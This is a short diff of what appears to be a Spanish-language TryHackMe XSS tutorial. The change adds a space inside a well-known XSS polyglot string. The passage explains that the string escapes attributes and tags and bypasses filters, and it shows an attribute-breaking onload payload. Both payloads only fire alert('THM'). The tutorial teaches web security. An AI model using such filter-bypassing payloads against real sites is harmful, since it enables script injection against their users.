@@ -115,5 +115,5 @@ Cambiemos el payload a esto: `/images/cat.jpg" onload="alert('THM');` y miramos 
 <h2>Polyglots</h2>
 Un polyglot XSS es una string de texto que puede escapar atributos, etiquetas y bypassear filtros de una sentada. Podrías haber usado el polyglot de aquí abajo en todos los 6 niveles que acabamos de ver y habría ejecutado el código exitosamente.
 
-``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
+``jaVasCript:/*-/*`/*\ `/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
 
